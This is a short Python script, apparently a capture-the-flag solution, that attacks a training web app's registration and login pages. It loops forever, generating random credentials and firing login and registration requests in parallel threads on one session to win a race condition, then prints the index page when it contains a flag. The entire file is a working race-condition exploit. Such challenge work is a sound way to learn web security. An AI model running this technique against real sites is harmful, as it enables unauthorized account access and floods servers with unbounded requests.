import requests
import string
import random
from threading import Thread
import time

URL = "http://meta.training.jinblack.it/"


def registration(s, u, p, l):
    url = "%s/register.php" % (URL,)
    payload = {'username': u, 'password_1': p, 'password_2': p, 'reg_user': l}
    r = s.post(url, data=payload)
    # print(r.text)
    return r.text


def login(s, u, p, l):
    while True:
        url = "%s/login.php" % (URL,)
        payload = {'username': u, 'password': p, 'log_user': l}
        r = s.post(url, data=payload)
        if "h3" in r.text:
            home(s)
            return

def home(s):
    url = "%s/index.php" % (URL,)
    r = s.get(url)
    if "flag" in r.text:
        print(r.text)


def random_string(n=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))


while True:
    p = random_string()
    u = p
    l = ""
    print(u, p)
    s = requests.Session()
    t_reg = Thread(target=registration, args=[s, u, p, l])
    t_login = Thread(target=login, args=[s, u, p, l])
    t_home = Thread(target=home, args=[s])
    t_login.start()
    t_reg.start()
